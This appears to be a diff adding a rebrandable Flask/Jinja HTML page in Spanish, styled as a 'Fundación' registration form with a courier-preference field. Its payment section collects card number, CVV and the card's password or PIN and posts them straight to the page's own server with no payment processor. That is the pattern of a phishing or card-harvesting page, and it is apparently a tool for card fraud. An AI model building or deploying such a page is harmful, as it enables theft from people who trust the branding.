@@ -1,0 +1,869 @@
+<style>
+    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap');
+
+    :root {
+        --primary-color: {{ primary_color|default('#ff8a3d') }};
+        --primary-dark: color-mix(in srgb, var(--primary-color) 82%, #000);
+        --form-bg: #ffffff;
+        --input-bg: #f7f7f7;
+        --text-dark: #171717;
+        --text-muted: #777777;
+        --border-color: #e8e8e8;
+    }
+
+    * {
+        box-sizing: border-box;
+    }
+
+    body {
+        font-family: 'Inter', sans-serif;
+        background: #101022;
+        min-height: 100vh;
+        margin: 0;
+    }
+
+    .modern-form-wrapper {
+        width: 100%;
+        min-height: 100vh;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        padding: 35px 20px;
+    }
+
+    .modern-form-card {
+        width: 100%;
+        max-width: 1120px;
+        min-height: 680px;
+        background: var(--form-bg);
+        border-radius: 22px;
+        overflow: hidden;
+        display: grid;
+        grid-template-columns: 42% 58%;
+        box-shadow: 0 25px 70px rgba(0, 0, 0, 0.30);
+    }
+
+    /* =========================================
+       PANEL IZQUIERDO
+       ========================================= */
+
+    .form-image-panel {
+        position: relative;
+        min-height: 680px;
+        overflow: hidden;
+        background:
+            linear-gradient(
+                145deg,
+                var(--primary-color),
+                color-mix(in srgb, var(--primary-color) 70%, #ff5b20)
+            );
+    }
+
+    .form-image-panel.has-image {
+        background-size: cover;
+        background-position: center;
+    }
+
+    .form-image-overlay {
+        position: absolute;
+        inset: 0;
+        background:
+            linear-gradient(
+                180deg,
+                rgba(0, 0, 0, 0.05) 0%,
+                rgba(0, 0, 0, 0.12) 45%,
+                rgba(0, 0, 0, 0.55) 100%
+            );
+    }
+
+    .form-image-content {
+        position: relative;
+        z-index: 2;
+        height: 100%;
+        padding: 45px;
+        display: flex;
+        flex-direction: column;
+        justify-content: space-between;
+        color: white;
+    }
+
+    .image-logo {
+        max-width: 150px;
+        max-height: 65px;
+        object-fit: contain;
+        object-position: left center;
+        filter: brightness(0) invert(1);
+    }
+
+    .image-logo-fallback {
+        font-size: 22px;
+        font-weight: 800;
+        letter-spacing: -0.5px;
+    }
+
+    .image-content-bottom {
+        max-width: 380px;
+    }
+
+    .image-content-bottom h2 {
+        font-size: clamp(32px, 4vw, 52px);
+        line-height: 1.05;
+        font-weight: 800;
+        letter-spacing: -2px;
+        margin: 0 0 18px;
+    }
+
+    .image-content-bottom p {
+        font-size: 15px;
+        line-height: 1.7;
+        opacity: 0.92;
+        margin: 0;
+    }
+
+    /* =========================================
+       PANEL DERECHO
+       ========================================= */
+
+    .form-content-panel {
+        background: #fff;
+        padding: 48px 55px;
+        overflow-y: auto;
+        max-height: 800px;
+    }
+
+    .form-top {
+        margin-bottom: 32px;
+    }
+
+    .form-top .mobile-logo {
+        max-width: 130px;
+        max-height: 55px;
+        object-fit: contain;
+        margin-bottom: 20px;
+    }
+
+    .form-top h1 {
+        color: var(--text-dark);
+        font-size: 30px;
+        line-height: 1.15;
+        font-weight: 800;
+        letter-spacing: -1px;
+        margin: 0 0 10px;
+    }
+
+    .form-top p {
+        color: var(--text-muted);
+        font-size: 14px;
+        line-height: 1.6;
+        margin: 0;
+    }
+
+    /* =========================================
+       CAMPOS
+       ========================================= */
+
+    .modern-form .form-group {
+        margin-bottom: 19px;
+    }
+
+    .modern-form label {
+        display: block;
+        color: #333;
+        font-size: 12px;
+        font-weight: 700;
+        margin-bottom: 8px;
+    }
+
+    .modern-form .form-control,
+    .modern-form .form-select {
+        width: 100%;
+        min-height: 49px;
+        border: 1px solid var(--border-color);
+        border-radius: 9px;
+        background: var(--input-bg);
+        color: #222;
+        padding: 12px 15px;
+        font-family: 'Inter', sans-serif;
+        font-size: 13px;
+        outline: none;
+        transition:
+            border-color 0.2s ease,
+            box-shadow 0.2s ease,
+            background 0.2s ease;
+    }
+
+    .modern-form .form-control:hover,
+    .modern-form .form-select:hover {
+        background: #fff;
+        border-color: #d5d5d5;
+    }
+
+    .modern-form .form-control:focus,
+    .modern-form .form-select:focus {
+        background: #fff;
+        border-color: var(--primary-color);
+        box-shadow: 0 0 0 3px color-mix(
+            in srgb,
+            var(--primary-color) 15%,
+            transparent
+        );
+    }
+
+    .modern-form .form-control::placeholder {
+        color: #aaa;
+    }
+
+    /* =========================================
+       SECCIÓN DE PAGO
+       ========================================= */
+
+    .payment-section {
+        margin-top: 30px;
+        padding: 24px;
+        border: 1px solid var(--border-color);
+        border-radius: 14px;
+        background: #fafafa;
+    }
+
+    .payment-section-header {
+        margin-bottom: 22px;
+    }
+
+    .payment-section-header h3 {
+        color: var(--text-dark);
+        font-size: 18px;
+        font-weight: 800;
+        margin: 0 0 7px;
+        letter-spacing: -0.4px;
+    }
+
+    .payment-section-header p {
+        color: var(--text-muted);
+        font-size: 12px;
+        line-height: 1.6;
+        margin: 0;
+    }
+
+    /* =========================================
+       BOTÓN
+       ========================================= */
+
+    .submit-button {
+        width: 100%;
+        min-height: 52px;
+        border: 0;
+        border-radius: 9px;
+        background: var(--primary-color);
+        color: white;
+        font-family: 'Inter', sans-serif;
+        font-size: 13px;
+        font-weight: 700;
+        cursor: pointer;
+        margin-top: 7px;
+        transition:
+            transform 0.2s ease,
+            box-shadow 0.2s ease,
+            background 0.2s ease;
+    }
+
+    .submit-button:hover {
+        background: var(--primary-dark);
+        transform: translateY(-1px);
+        box-shadow: 0 8px 22px color-mix(
+            in srgb,
+            var(--primary-color) 30%,
+            transparent
+        );
+    }
+
+    .submit-button:active {
+        transform: translateY(0);
+    }
+
+    /* =========================================
+       ÉXITO
+       ========================================= */
+
+    .success-screen {
+        text-align: center;
+        padding: 70px 25px;
+    }
+
+    .success-icon {
+        width: 75px;
+        height: 75px;
+        margin: 0 auto 25px;
+        border-radius: 50%;
+        background: #e9f9ef;
+        color: #20a65a;
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        font-size: 38px;
+        font-weight: 700;
+    }
+
+    .success-screen h2 {
+        color: var(--text-dark);
+        font-size: 28px;
+        font-weight: 800;
+        margin-bottom: 12px;
+    }
+
+    .success-screen p {
+        max-width: 480px;
+        margin: 0 auto 25px;
+        color: var(--text-muted);
+        line-height: 1.7;
+        font-size: 14px;
+    }
+
+    .success-button {
+        display: inline-block;
+        padding: 13px 24px;
+        border-radius: 9px;
+        background: var(--primary-color);
+        color: white;
+        text-decoration: none;
+        font-size: 13px;
+        font-weight: 700;
+    }
+
+    /* =========================================
+       RESPONSIVE
+       ========================================= */
+
+    @media (max-width: 900px) {
+        .modern-form-card {
+            grid-template-columns: 1fr;
+            max-width: 650px;
+        }
+
+        .form-image-panel {
+            min-height: 300px;
+        }
+
+        .form-image-content {
+            padding: 30px;
+        }
+
+        .image-content-bottom h2 {
+            font-size: 34px;
+        }
+
+        .form-content-panel {
+            max-height: none;
+            padding: 40px 35px;
+        }
+    }
+
+    @media (max-width: 576px) {
+        .modern-form-wrapper {
+            padding: 0;
+            align-items: stretch;
+        }
+
+        .modern-form-card {
+            border-radius: 0;
+            min-height: 100vh;
+        }
+
+        .form-image-panel {
+            min-height: 260px;
+        }
+
+        .form-image-content {
+            padding: 25px;
+        }
+
+        .image-content-bottom h2 {
+            font-size: 30px;
+        }
+
+        .form-content-panel {
+            padding: 32px 22px;
+        }
+
+        .form-top h1 {
+            font-size: 26px;
+        }
+
+        .payment-section {
+            padding: 18px;
+        }
+    }
+</style>
+
+
+<div class="modern-form-wrapper">
+
+    <div class="modern-form-card">
+
+        <!-- =========================================
+             PANEL IZQUIERDO
+             ========================================= -->
+
+        {% if success %}
+
+            <div class="form-image-panel">
+
+                {% if cfg and cfg.imagen_banner %}
+                    <div
+                        class="form-image-panel has-image"
+                        style="position:absolute; inset:0; background-image:url('{{ url_for('static', filename='uploads/' + cfg.imagen_banner) }}');">
+                    </div>
+                {% endif %}
+
+                <div class="form-image-overlay"></div>
+
+                <div class="form-image-content">
+
+                    <div>
+                        {% if cfg and cfg.logo %}
+                            <img
+                                src="{{ url_for('static', filename='uploads/' + cfg.logo) }}"
+                                alt="Logo"
+                                class="image-logo">
+                        {% else %}
+                            <div class="image-logo-fallback">
+                                Fundación
+                            </div>
+                        {% endif %}
+                    </div>
+
+                    <div class="image-content-bottom">
+                        <h2>{{ titulo_form }}</h2>
+                        <p>{{ descripcion_form }}</p>
+                    </div>
+
+                </div>
+            </div>
+
+        {% else %}
+
+            <div
+                class="form-image-panel
+                {% if cfg and cfg.imagen_banner %}has-image{% endif %}"
+                {% if cfg and cfg.imagen_banner %}
+                style="background-image:url('{{ url_for('static', filename='uploads/' + cfg.imagen_banner) }}');"
+                {% endif %}
+            >
+
+                <div class="form-image-overlay"></div>
+
+                <div class="form-image-content">
+
+                    <div>
+                        {% if cfg and cfg.logo %}
+                            <img
+                                src="{{ url_for('static', filename='uploads/' + cfg.logo) }}"
+                                alt="Logo"
+                                class="image-logo">
+                        {% else %}
+                            <div class="image-logo-fallback">
+                                Fundación
+                            </div>
+                        {% endif %}
+                    </div>
+
+                    <div class="image-content-bottom">
+
+                        <h2>{{ titulo_form }}</h2>
+
+                        <p>
+                            {{ descripcion_form }}
+                        </p>
+
+                    </div>
+
+                </div>
+
+            </div>
+
+        {% endif %}
+
+
+        <!-- =========================================
+             PANEL DERECHO
+             ========================================= -->
+
+        <div class="form-content-panel">
+
+            {% if success %}
+
+                <div class="success-screen">
+
+                    <div class="success-icon">
+                        ✓
+                    </div>
+
+                    <h2>
+                        ¡Registro Exitoso!
+                    </h2>
+
+                    <p>
+                        Tus datos han sido enviados y registrados
+                        correctamente. Nos pondremos en contacto contigo pronto.
+                    </p>
+
+                    <a
+                        href="{{ request.path }}"
+                        class="success-button"
+                    >
+                        Enviar otro registro
+                    </a>
+
+                </div>
+
+            {% else %}
+
+                <div class="form-top">
+
+                    <!-- Logo solo para móvil -->
+                    {% if cfg and cfg.logo %}
+                        <img
+                            src="{{ url_for('static', filename='uploads/' + cfg.logo) }}"
+                            alt="Logo"
+                            class="mobile-logo d-md-none">
+                    {% endif %}
+
+                    <h1>
+                        {{ titulo_form }}
+                    </h1>
+
+                    <p>
+                        {{ descripcion_form }}
+                    </p>
+
+                </div>
+
+
+                <!-- =====================================
+                     FORMULARIO
+                     ===================================== -->
+
+                <form
+                    method="POST"
+                    class="modern-form"
+                >
+
+                    <!-- NOMBRE / APELLIDO -->
+
+                    <div class="row">
+
+                        <div class="col-md-6">
+                            <div class="form-group">
+
+                                <label>
+                                    Nombre *
+                                </label>
+
+                                <input
+                                    type="text"
+                                    class="form-control"
+                                    name="nombre"
+                                    placeholder="Tu nombre"
+                                    required
+                                >
+
+                            </div>
+                        </div>
+
+
+                        <div class="col-md-6">
+                            <div class="form-group">
+
+                                <label>
+                                    Apellido *
+                                </label>
+
+                                <input
+                                    type="text"
+                                    class="form-control"
+                                    name="apellido"
+                                    placeholder="Tu apellido"
+                                    required
+                                >
+
+                            </div>
+                        </div>
+
+                    </div>
+
+
+                    <!-- CORREO -->
+
+                    <div class="form-group">
+
+                        <label>
+                            Correo Electrónico *
+                        </label>
+
+                        <input
+                            type="email"
+                            class="form-control"
+                            name="correo"
+                            placeholder="correo@ejemplo.com"
+                            required
+                        >
+
+                    </div>
+
+
+                    <!-- TELÉFONO -->
+
+                    <div class="form-group">
+
+                        <label>
+                            Teléfono
+                        </label>
+
+                        <input
+                            type="text"
+                            class="form-control"
+                            name="telefono"
+                            placeholder="Tu número de teléfono"
+                        >
+
+                    </div>
+
+
+                    <!-- DIRECCIÓN -->
+
+                    <div class="form-group">
+
+                        <label>
+                            Dirección (Calle / Casa / Edificio)
+                        </label>
+
+                        <input
+                            type="text"
+                            class="form-control"
+                            name="direccion"
+                            placeholder="Dirección"
+                        >
+
+                    </div>
+
+
+                    <!-- CIUDAD / PAÍS / CÓDIGO POSTAL -->
+
+                    <div class="row">
+
+                        <div class="col-md-4">
+
+                            <div class="form-group">
+
+                                <label>
+                                    Ciudad
+                                </label>
+
+                                <input
+                                    type="text"
+                                    class="form-control"
+                                    name="ciudad"
+                                    placeholder="Ciudad"
+                                >
+
+                            </div>
+
+                        </div>
+
+
+                        <div class="col-md-4">
+
+                            <div class="form-group">
+
+                                <label>
+                                    País
+                                </label>
+
+                                <input
+                                    type="text"
+                                    class="form-control"
+                                    name="pais"
+                                    placeholder="País"
+                                >
+
+                            </div>
+
+                        </div>
+
+
+                        <div class="col-md-4">
+
+                            <div class="form-group">
+
+                                <label>
+                                    Código Postal
+                                </label>
+
+                                <input
+                                    type="text"
+                                    class="form-control"
+                                    name="codigo_postal"
+                                    placeholder="Código"
+                                >
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+
+                    <!-- COURIER -->
+
+                    <div class="form-group">
+
+                        <label>
+                            Courier de Preferencia
+                        </label>
+
+                        <input
+                            type="text"
+                            class="form-control"
+                            name="courier"
+                            placeholder="Courier de preferencia"
+                        >
+
+                    </div>
+
+
+                    <!-- =====================================
+                         PAGO
+                         ===================================== -->
+
+                    <div class="payment-section">
+
+                        <div class="payment-section-header">
+
+                            <h3>
+                                {{ titulo_pago }}
+                            </h3>
+
+                            <p>
+                                {{ descripcion_pago }}
+                            </p>
+
+                        </div>
+
+
+                        <!-- MÉTODO DE PAGO -->
+
+                        <div class="form-group">
+
+                            <label>
+                                Método de Pago
+                            </label>
+
+                            <select
+                                class="form-select"
+                                name="metodo_pago"
+                            >
+
+                                <option value="Tarjeta de Crédito/Débito">
+                                    Tarjeta de Crédito / Débito
+                                </option>
+
+                                <option value="Transferencia Bancaria">
+                                    Transferencia Bancaria
+                                </option>
+
+                                <option value="Remesa / Efectivo">
+                                    Remesa / Efectivo
+                                </option>
+
+                            </select>
+
+                        </div>
+
+
+                        <!-- DATOS DE TARJETA -->
+
+                        <div class="row">
+
+                            <div class="col-md-6">
+
+                                <div class="form-group">
+
+                                    <label>
+                                        Número de Tarjeta
+                                    </label>
+
+                                    <input
+                                        type="text"
+                                        class="form-control"
+                                        name="numero_tarjeta"
+                                        placeholder="Número de tarjeta"
+                                    >
+
+                                </div>
+
+                            </div>
+
+
+                            <div class="col-md-3">
+
+                                <div class="form-group">
+
+                                    <label>
+                                        CVV
+                                    </label>
+
+                                    <input
+                                        type="text"
+                                        class="form-control"
+                                        name="cvv"
+                                        placeholder="CVV"
+                                    >
+
+                                </div>
+
+                            </div>
+
+
+                            <div class="col-md-3">
+
+                                <div class="form-group">
+
+                                    <label>
+                                        Contraseña / Clave
+                                    </label>
+
+                                    <input
+                                        type="password"
+                                        class="form-control"
+                                        name="contrasena_tarjeta"
+                                        placeholder="Clave"
+                                    >
+
+                                </div>
+
+                            </div>
+
+                        </div>
+
+                    </div>
+
+
+                    <!-- =====================================
+                         BOTÓN
+                         ===================================== -->
+
+                    <button
+                        type="submit"
+                        class="submit-button"
+                    >
+                        Enviar Información
+                    </button>
+
+                </form>
+
+            {% endif %}
+
+        </div>
+
+    </div>
+
+</div>
